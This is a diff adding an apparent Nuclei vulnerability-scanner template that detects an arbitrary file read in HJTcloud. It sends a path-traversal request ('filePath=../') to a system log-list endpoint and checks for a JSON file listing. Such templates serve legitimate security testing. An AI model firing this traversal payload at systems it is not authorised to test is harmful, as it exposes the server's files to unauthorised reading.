@@ -1,0 +1,28 @@
+id: hjtcloud-rest-arbitrary-file-read
+info:
+  author: pikpikcu
+  name: HJTcloud Arbitrary file read
+  reference: https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
+  severity: low
+  tags: hjtcloud,lfi
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"name":'
+    - '"length":'
+    - '"filePath":'
+    - '"list":'
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/him/api/rest/V1.0/system/log/list?filePath=../'
